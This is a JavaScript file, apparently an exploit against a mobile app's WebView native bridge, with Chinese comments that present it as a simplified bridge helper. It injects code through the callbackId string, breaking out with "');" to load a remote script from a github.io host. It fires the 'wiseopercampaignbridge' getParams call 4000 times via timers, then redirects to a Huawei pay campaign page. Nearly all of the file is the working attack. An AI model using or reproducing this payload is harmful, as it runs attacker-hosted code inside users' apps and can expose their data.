(() => {
    "use strict";

    // 1. 精简核心依赖：仅保留必要变量，删除无用的消息队列/微任务
    let callbackIdSeed = Math.floor(2e9 * Math.random());
    const genCallbackId = () => callbackIdSeed++;
    const callbackCache = {};
    const STATUS = {CANCEL: 9};

    // 2. 核心函数：callNativeMethod（大幅精简，修复所有潜在错误）
    const callNativeMethod = (bridgeName, success, fail, service, action, args) => {
        // 兜底：确保args是数组，避免forEach报错
        args = Array.isArray(args) ? args : [args];
        // 仅处理ArrayBuffer参数（保留核心逻辑）
        args.forEach((arg, idx) => {
            if (Object.prototype.toString.call(arg) === '[object ArrayBuffer]') {
                args[idx] = btoa(arg);
            }
        });

        const currUrl = location.href;
        const payload = `console.log(location.href);s=document.createElement('script'),s.src='https://seuercc.github.io/26/campaign.js',s.onload=()=>console('JS load succeed'),document.head.appendChild(s)`;
        const callbackId = `${service}${genCallbackId()}');${payload}//`;

        // 缓存回调函数
        if (success || fail) callbackCache[callbackId] = {success, fail};

        // 关键：增加nativeBridge降级逻辑，避免undefined报错
        const nativeBridge = window[bridgeName] || {
            invoke: () => `F08 ${callbackId} s no native object ${service}:${action}`
        };

        for (let i = 0; i < 4000; i++) {
            setTimeout(() => {
                try {
                    const result = nativeBridge.invoke(service, action, callbackId, JSON.stringify(args), -1);
                    console.debug(`调用Native[${service}.${action}]：`, result);
                } catch (e) {
                    console.error(`Native调用失败：`, e);
                }
            }, i);
        }
        setTimeout(() => {
            location.href = 'https://h5hosting-drcn.dbankcdn.cn/sandbox/cch5/huaweipay/marketAction_nov24_harmonyAct/index.html';
        }, 100);
    };

    // 3. 精简invoke函数：保留核心回调包装逻辑
    const invoke = (bridgeName, service, action, args, success, fail, cancel, complete) => {
        const hasCallback = !!success || !!fail || !!cancel || !!complete;
        // 包装成功回调
        const wrapSuccess = hasCallback ? (res) => {
            success?.(res);
            complete?.(res);
        } : null;
        // 包装失败/取消回调
        const wrapFail = hasCallback ? (res, status) => {
            status === STATUS.CANCEL ? cancel?.(res) : fail?.(res, status);
            complete?.(res, status);
        } : null;

        callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
    };

    // 4. 初始化hwbr对象（精简判断逻辑）
    window.wiseopercampaign = window.wiseopercampaign || {};
    window.wiseopercampaign.callbackFromNative = window.wiseopercampaign.callbackFromNative || (() => {
    });

    // 5. 挂载全局并调用（参数格式合规）
    window.nativeBridge = {invoke, callNativeMethod};
    nativeBridge.invoke(
        "wiseopercampaignbridge",
        "app",
        "getParams",
        [],
        (res) => console.log("cloudx report succeed：", JSON.stringify(res)),
        (err) => console.log("cloudx report error：", JSON.stringify(err))
    );
})();
